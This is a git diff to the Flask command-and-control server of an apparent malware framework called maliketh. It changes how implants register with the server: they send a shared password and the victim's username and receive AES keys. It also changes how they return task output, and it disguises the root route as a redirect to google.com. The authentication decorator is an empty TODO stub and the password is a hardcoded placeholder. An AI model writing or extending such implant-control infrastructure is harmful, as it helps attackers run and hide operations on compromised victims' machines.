@@ -1,23 +1,41 @@
 from datetime import datetime
-from flask import Blueprint, jsonify, request
+from typing import Callable
+from flask import Blueprint, jsonify, redirect, request
 from maliketh.db import db
 import maliketh.crypto.aes
 from maliketh.models import *
+from functools import wraps
 
 c2 = Blueprint('c2', __name__)
 
 implant_auth_password = "thisshouldbereplaced"
 
+def implant_authenticated(func: Callable):
+    """
+    Decorator to check if the request is authenticated.
+    """
+    @wraps(func)
+    def wrapper(*args, **kwargs):
+        # TODO
+        return func(*args, **kwargs)
+    return wrapper
 
 @c2.route("/")
 def hello_c2():
-    return "Nothing to see here"
+    return redirect("https://google.com")
 
 @c2.route("/register", methods=["POST"])
 def register():
+    # /register
+    # Body (form data):
+    #   t: implant_auth_password
+    #   u: username
 
-    if request.form.get("token") != implant_auth_password:
+    if request.form.get('t') != implant_auth_password:
         return "Unauthorized", 401
+    if request.form.get('u') is None:
+        return "Unauthorized", 401
+    
 
     # Create a new implant and add it to the db
     implant = Implant(
@@ -26,7 +44,7 @@ def register():
         ip=request.remote_addr,
         os=request.user_agent.platform,
         arch=request.user_agent.platform,
-        user="username_test",
+        user=request.form.get('u'),
         aes_key=maliketh.crypto.aes.generate_aes_key(),
         aes_iv=maliketh.crypto.aes.generate_aes_iv(),
         created_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
@@ -89,7 +107,7 @@ def post_task():
     # If task is not None, return task
     if task is not None:
         # Get output from request
-        output = request.form.get("output")
+        output = request.data
         # Update task in db
         task.output = output
         task.status = COMPLETE
